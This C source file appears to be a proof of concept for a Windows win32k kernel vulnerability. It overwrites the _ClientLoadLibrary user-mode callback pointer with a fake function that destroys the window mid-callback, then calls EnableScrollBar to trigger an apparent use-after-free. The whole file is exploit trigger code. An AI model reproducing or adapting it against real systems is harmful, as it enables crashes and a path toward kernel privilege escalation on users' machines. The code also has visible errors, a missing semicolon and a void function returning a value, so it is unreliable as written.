#include<stdio.h>
#include "Struct.h"

const char szClassName[] = "Poc";
HWND hWnd = NULL;
ULONG_PTR _ClientLoadLibrary_addr;
fct_clLoadLib _ClientLoadLibrary;
int hookflag = 0;
int hookcount = 0;

VOID Fake_ClientLoadLibrary()
{
	if (hookflag)
	{
		if (++hookcount == 2)
		{
			hookflag = 0
			DestroyWindow(hWnd);
		}
	}
}

VOID Hook_ClientLoadLibrary()
{
	DWORD dwOldProtect;
	// Get _ClientLoadLibrary
	_ClientLoadLibrary_addr = GetHookSaveFunctionAddr();

	_ClientLoadLibrary = (fct_clLoadLib) * (ULONG_PTR*)_ClientLoadLibrary_addr;

	if (!VirtualProtect((LPVOID)_ClientLoadLibrary_addr, 0x1000, PAGE_READWRITE, &dwOldProtect))
	{
		printf("[+] Alloc ClientLoadLibrary address failed!!!\n");
		system("pause");
		return;
	}

	*(ULONG_PTR*)_ClientLoadLibrary_addr = (ULONG_PTR)Fake_ClientLoadLibrary;

	if (!VirtualProtect((LPVOID)_ClientLoadLibrary_addr, 0x1000, dwOldProtect, &dwOldProtect))
	{
		printf("[+] Set ClientLoadLibrary address failed!!!\n");
		system("pause");
		return;
	}
}

VOID Poc()
{
	Hook_ClientLoadLibrary();

	WNDCLASSEXA wc;

	wc.cbSize = sizeof(WNDCLASSEX);
	wc.style = 0;
	wc.lpfnWndProc = DefWindowProcA;
	wc.cbClsExtra = 0;
	wc.cbWndExtra = 0;
	wc.hInstance = GetModuleHandleA(NULL);
	wc.hIcon = LoadIcon(NULL, IDI_APPLICATION);
	wc.hCursor = LoadCursor(NULL, IDC_ARROW);
	wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
	wc.lpszMenuName = NULL;
	wc.lpszClassName = szClassName;
	wc.hIconSm = LoadIcon(NULL, IDI_APPLICATION);

	if (!RegisterClassExA(&wc))	// 注册窗口
	{
		if (GetLastError() != ERROR_CLASS_ALREADY_EXISTS)
			return;
	}

	hWnd = CreateWindowExA(
		0,
		szClassName,
		0,
		SBS_HORZ | WS_HSCROLL | WS_VSCROLL, // 0x300000
		10,
		10,
		100,
		100,
		NULL,
		NULL,
		NULL,
		NULL
	);

	if (hWnd == NULL)
	{
		printf("[+] CreateWindow failed !!!\n");
		printf("[+] Error code is : %d\n", GetLastError());
		system("pause");
		return 0;
	}

	ShowWindow(hWnd, SW_SHOW);
	UpdateWindow(hWnd);

	hookflag = 1;
	EnableScrollBar(
		hWnd, 
		SB_CTL | SB_BOTH, // wSBflags = 3 滚动条是滚动条控件 | 启用或禁用与指定窗口关联的水平和垂直滚动条上的箭头
		ESB_DISABLE_BOTH  // wArrows  = 3 禁用滚动条上的两个箭头
	);

	return 0;
}

int main()
{
	Poc();
	system("pause");
	return 0;
}